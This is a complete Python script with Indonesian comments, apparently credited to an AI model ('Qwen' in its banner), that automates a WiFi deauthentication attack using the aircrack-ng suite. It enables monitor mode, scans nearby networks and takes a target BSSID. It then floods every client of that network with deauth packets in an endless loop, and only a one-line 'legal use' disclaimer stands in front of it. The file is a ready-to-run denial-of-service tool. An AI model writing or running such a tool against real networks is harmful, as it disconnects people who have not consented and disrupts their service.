import subprocess
import re
import time
import os

# Cek apakah user adalah root
def check_root():
    if os.geteuid() != 0:
        print("[!] Jalankan dengan sudo!")
        exit(1)

# Deteksi interface wireless
def detect_wireless_interface():
    result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    interfaces = re.findall(r'(\w+)\s+IEEE', result.stdout)
    if not interfaces:
        print("[!] Tidak ada wireless interface yang tersedia.")
        exit(1)
    return interfaces[0]

# Masuk ke mode monitor
def enable_monitor_mode(interface):
    print(f"[+] Mengubah {interface} ke mode monitor...")
    subprocess.run(["airmon-ng", "start", interface])
    return f"{interface}mon"

# Keluar dari mode monitor
def disable_monitor_mode(interface):
    print(f"[+] Mematikan mode monitor pada {interface}...")
    subprocess.run(["airmon-ng", "stop", interface])

# Scan jaringan WiFi & client
def scan_wifi(interface):
    print("[+] Mulai scanning WiFi... (Tekan Ctrl+C untuk berhenti)")
    try:
        subprocess.run(["airodump-ng", interface])
    except KeyboardInterrupt:
        print("\n[+] Scanning dihentikan.")

# Scan detail satu jaringan + client
def scan_target(interface, bssid, channel):
    print(f"[+] Memulai scan untuk BSSID {bssid} di channel {channel}")
    try:
        subprocess.run([
            "airodump-ng",
            "--bssid", bssid,
            "-c", str(channel),
            interface
        ])
    except KeyboardInterrupt:
        print("\n[+] Scan target dihentikan.")

# Kirim paket deauthentication
def deauth_attack(interface, bssid, client="FF:FF:FF:FF:FF:FF"):
    print(f"[+] Memulai deauth attack ke BSSID {bssid}, Client {client}")
    subprocess.run([
        "aireplay-ng",
        "--deauth", "0",  # 0 = terus-menerus sampai client disconnect
        "-a", bssid,
        "-c", client,
        interface
    ])

# Menu utama
def main():
    check_root()

    print("💀 Qwen - WiFi DeathAuth Tool")
    print("⚠️ Hanya untuk jaringan yang sah dan legal.\n")

    interface = detect_wireless_interface()
    print(f"[✓] Interface ditemukan: {interface}")

    monitor_iface = enable_monitor_mode(interface)
    try:
        # Scan semua WiFi
        print("\n[+] Langkah 1: Lakukan scanning WiFi...")
        input("Tekan Enter untuk mulai scanning (akhiri dengan Ctrl+C)...\n")
        scan_wifi(monitor_iface)

        # Input target
        bssid = input("\nMasukkan BSSID target: ").strip()
        channel = input("Masukkan Channel target: ").strip()

        # Scan detail target
        input("\nTekan Enter untuk scan detail target...")
        scan_target(monitor_iface, bssid, channel)

        input("\nTekan Enter untuk mulai DeathAuth (deauth)...")

        while True:
            print("\n[+] Melakukan deauth ke semua client...")
            deauth_attack(monitor_iface, bssid)
            print("[!] Ulangi deauth dalam 10 detik...")
            time.sleep(10)

    finally:
        disable_monitor_mode(monitor_iface)

if __name__ == "__main__":
    main()